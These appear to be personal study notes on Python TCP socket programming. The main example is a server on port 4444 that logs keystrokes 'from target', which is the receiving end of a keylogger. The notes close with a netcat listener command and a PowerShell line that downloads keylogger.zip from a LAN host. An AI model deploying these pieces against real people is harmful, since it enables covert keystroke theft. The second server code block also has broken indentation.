python
Socket programming is a way to enable communication between two devices over a network. Allows devices send and receive data through a connection, such devices we refer to as **sockets**. These sockets can communicate using different protocols, but most often TCP or UDP.

Usually used in the context of: **client-server**, still its possible to use socket programming for client to client, and in situations with multiple clients and servers.  


**Socket properties:**
- IP address 
- Port number. 
- Listen for incoming connections 
- Communicate (Read and write)
- Can be open/closed
- Low-level & flexible 

**Usage:**
- Custom network protocols, real time applications 
- Scenarios requiring fine-grind control over data transmission. 
- Good for transferring files with build in commands for file operations. 


( Client needs the servers IP / Port for it to connect to the server. ) 

Setting up a basic server socket in python:
- It listens for incoming connections. 
- Read keystrokes from target.
- Logs keystrokes

````python 

import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 4444))
    server_socket.listen(1)
    print("Server listening on port 4444")

    conn, addr = server_socket.accept()
    print(f"Connection from {addr}")

    with open("received_keystrokes.txt", "a") as file:
        while True:
            data = conn.recv(1024).decode("utf-8")
            if not data:
                break
            print(f"Received: {data}")
            file.write(data)
            file.flush()

    conn.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
````

**Communication not over LAN:**
- Port Forwarding:
- Dynamic DNS:
- Firewalls:


Server socket:
````python
import socket
# Address family: AF.INET -> IPv4

# Socket type: SOCK_STREAM -> (TCP) Sequenced, reliable, two-way connection-based byte streams

# Creates a new socket object

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Network interface: '0.0.0.0' -> All network interfaces the device uses

# Port: 54 000 within each network interface

# Spesify network interface and which port we want to listen from.

server_socket.bind(('0.0.0.0', 54000))

# Number of connections the server can handle at once

server_socket.listen(5)

print("Server listening on port 54000")

# Running server and waiting for a connection.

while True:

client_socket, client_addr = server_socket.accept()

print(f"Connection from {client_addr}")

# Listen for data from client.

while True:

data = client_socket.recv(1024)

if not data:

print("No data received.")

break

print(f"Received data: {data.decode('utf.8')}")

#TODO: Save data to file.
# Breaking for inner loop -> close the connection to that client

client_socket.close()
````


Listening for incoming calls from windows on Linux:
```
nc -lvnp 8081
```

Transfere file via HTTP using powershell:
``` PS1

powershell -Command "Invoke-WebRequest -Uri http://192.168.56.101:8000/keylogger.zip -Outfile keylogger.zip

```